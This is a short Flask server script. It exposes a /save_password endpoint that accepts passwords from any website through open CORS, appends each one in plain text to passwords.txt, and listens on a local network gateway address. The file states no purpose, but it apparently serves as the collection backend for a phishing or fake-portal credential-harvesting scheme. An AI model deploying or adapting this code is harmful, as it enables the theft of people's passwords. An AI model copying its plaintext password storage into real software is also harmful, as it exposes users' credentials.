from flask import Flask, request
from flask_cors import CORS 

app = Flask(__name__)
CORS(app)  # Enable CORS for the entire app

@app.route('/save_password', methods=['POST'])
def save_password():
    password = request.json.get('password')
    if password:
        with open('passwords.txt', 'a') as file:
            file.write(password + "\n")
        return 'Password saved successfully!', 200
    else:
        return 'No password provided', 400

if __name__ == '__main__':
    app.run(host='192.168.10.1', port=8080)
